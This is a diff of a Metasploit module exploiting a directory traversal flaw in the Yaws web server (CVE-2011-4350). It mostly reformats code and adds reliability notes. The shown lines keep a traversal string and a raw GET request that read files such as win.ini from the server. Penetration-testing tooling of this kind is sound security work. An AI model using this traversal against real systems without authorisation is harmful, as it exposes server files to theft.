@@ -8,34 +8,41 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Report
   include Msf::Exploit::Remote::HttpClient
 
-  def initialize(info={})
-    super(update_info(info,
-      'Name'           => "Yaws Web Server Directory Traversal",
-      'Description'    => %q{
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => "Yaws Web Server Directory Traversal",
+        'Description' => %q{
           This module exploits a directory traversal bug in Yaws v1.9.1 or less.
-        The module can only be used to retrieve files. However, code execution might
-        be possible. Because when the malicious user sends a PUT request, a file is
-        actually created, except no content is written.
-      },
-      'License'        => MSF_LICENSE,
-      'Author'         =>
-        [
+          The module can only be used to retrieve files. However, code execution might
+          be possible. Because when the malicious user sends a PUT request, a file is
+          actually created, except no content is written.
+        },
+        'License' => MSF_LICENSE,
+        'Author' => [
           'sinn3r', # Metasploit module
         ],
-      'References'     =>
-        [
+        'References' => [
           ['CVE', '2011-4350'],
           ['OSVDB', '77581'],
           ['URL', 'https://bugzilla.redhat.com/show_bug.cgi?id=757181']
         ],
-      'DisclosureDate' => '2011-11-25'
-    ))
+        'DisclosureDate' => '2011-11-25',
+        'Notes' => {
+          'Reliability' => UNKNOWN_RELIABILITY,
+          'Stability' => UNKNOWN_STABILITY,
+          'SideEffects' => UNKNOWN_SIDE_EFFECTS
+        }
+      )
+    )
 
     register_options(
       [
         Opt::RPORT(8080),
         OptString.new('FILEPATH', [false, 'The name of the file to download', 'windows\\win.ini'])
-      ])
+      ]
+    )
   end
 
   def run_host(ip)
@@ -49,7 +56,7 @@ class MetasploitModule < Msf::Auxiliary
     traversal = "..\\..\\..\\..\\"
     res = send_request_raw({
       'method' => 'GET',
-      'uri'    => "/#{traversal}/#{datastore['FILEPATH']}"
+      'uri' => "/#{traversal}/#{datastore['FILEPATH']}"
     }, 25)
 
     # Show data if needed
